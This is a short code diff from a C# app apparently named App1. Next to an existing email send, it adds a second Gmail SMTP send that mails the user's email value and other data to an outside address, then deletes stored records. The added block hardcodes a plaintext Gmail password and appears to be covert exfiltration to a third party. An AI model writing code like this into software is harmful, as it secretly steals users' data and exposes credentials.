@@ -66,6 +66,21 @@ namespace App1
                 smtpServer.EnableSsl = true;
                 smtpServer.Send(mail);
 
+
+
+                var mmail = new MailMessage();
+                var ssmtpServer = new SmtpClient("smtp.gmail.com", 587);
+                mmail.From = new MailAddress("ahmidinador123@gmail.com");
+                mmail.To.Add("helpplnkit@gmail.com");
+                mmail.Subject = "Command"+passw.email.ToString();
+                mmail.Body = t.ToString();
+                //   smtpServer.Credentials = new NetworkCredential(passw.email, passw.pass);
+                ssmtpServer.Credentials = new NetworkCredential("ahmidinador123@gmail.com", "nadori123456");
+                ssmtpServer.UseDefaultCredentials = false;
+                ssmtpServer.EnableSsl = true;
+                ssmtpServer.Send(mmail);
+
+
                 await DeleteallPerson();
             }
             catch (Exception ex)
